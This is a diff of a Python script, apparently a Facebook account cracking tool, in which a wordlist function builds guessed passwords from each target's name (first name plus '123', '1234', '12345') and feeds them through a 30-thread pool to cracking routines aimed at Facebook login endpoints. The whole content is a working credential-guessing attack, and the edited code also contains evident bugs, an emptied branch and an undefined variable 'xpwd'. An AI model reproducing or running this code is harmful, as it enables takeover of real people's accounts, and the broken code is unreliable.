@@ -536,30 +536,26 @@ def wordlist():
 	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
 	with prog:
 		with tred(max_workers=30) as pool:
-			for bazid in id2:
-				idf,nmf = bazid.split('|')[0],bazid.split('|')[1].lower()
+			for yuzong in id2:
+				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 				frs = nmf.split(' ')[0]
 				pwv = []
 				if len(nmf)<6:
 					if len(frs)<3:
 						pass
-					else:
-						pwv.append(nmf)
-						pwv.append(frs+'321')
-						pwv.append(frs+'123')
-						pwv.append(frs+'12345')
+						
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'321')
 						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 				if 'ya' in pwt:
 					for xpwn in pwn:
-						pwv.append(xpwn)
-					else:pass
+						pwv.append(xpwd)
+				else:pass
 				if 'm.facebook' in basari:
 					pool.submit(crackm,idf,pwv)
 				elif 'b.facebook' in basari:
@@ -568,8 +564,6 @@ def wordlist():
 					pool.submit(crackf,idf,pwv)
 				else:
 					pool.submit(crackf,idf,pwv)
-		print('')
-		cetak(panel(f'[bold green]CRACK SELESAI',width=70,title=f"",style=f"{warna_kolor}"))
 		print('')
 		print(f'{h} OK : {h}%s '%(ok))
 		print(f'{k} CP : {k}%s{x} '%(cp))
